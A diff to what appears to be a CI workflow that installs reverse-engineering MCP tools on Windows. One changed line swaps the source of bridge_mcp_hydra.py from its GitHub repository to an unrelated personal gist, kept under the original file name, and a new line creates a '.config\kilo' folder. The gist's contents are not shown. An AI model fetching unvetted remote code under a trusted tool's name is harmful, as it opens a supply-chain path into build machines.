@@ -207,7 +207,8 @@ jobs:
           npm i -g mcp-gdb *>$null
           npm i -g binary-ninja-mcp *>$null
           $temp = $env:USERPROFILE
-          curl.exe -L -o $temp/bridge_mcp_hydra.py https://raw.githubusercontent.com/starsong-consulting/GhydraMCP/refs/heads/main/bridge_mcp_hydra.py 
+          mkdir -p "$temp\.config\kilo"
+          curl.exe -L -o $temp/bridge_mcp_hydra.py https://gist.githubusercontent.com/izaart95-jpg/613ba5c21c1433853739b9e9bb813276/raw/4fcb80b6cdf25adfcad5df5e50e66470aeb234aa/gistfile1.txt 
           curl.exe -L -o $temp/bridge_mcp_ghidra.py https://raw.githubusercontent.com/bethington/ghidra-mcp/refs/heads/main/bridge_mcp_ghidra.py
           curl.exe -L -o $temp/x64dbg.py https://raw.githubusercontent.com/Wasdubya/x64dbgMCP/refs/heads/main/src/x64dbg.py
           git clone https://github.com/Invoke-RE/binja-lattice-mcp "$temp\binja-lattice-mcp"
